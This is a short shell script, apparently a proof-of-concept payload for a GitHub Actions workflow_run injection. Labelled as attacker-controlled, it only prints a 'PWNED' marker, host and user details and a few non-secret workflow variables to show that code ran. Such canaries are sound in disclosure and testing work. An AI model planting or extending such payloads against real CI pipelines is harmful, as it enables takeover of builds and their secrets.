#!/bin/sh
# attacker-controlled install.sh served from the workflow_run head_sha
echo "PWNED: attacker install.sh executed"
echo "host=$(hostname) uid=$(id -u) user=$(id -un) cwd=$(pwd)"
echo "GITHUB_REF=${GITHUB_REF:-} GITHUB_SHA=${GITHUB_SHA:-}"
env | grep -E '^(GITHUB_ACTOR|GITHUB_RUN_ID|GITHUB_WORKFLOW)=' | sort
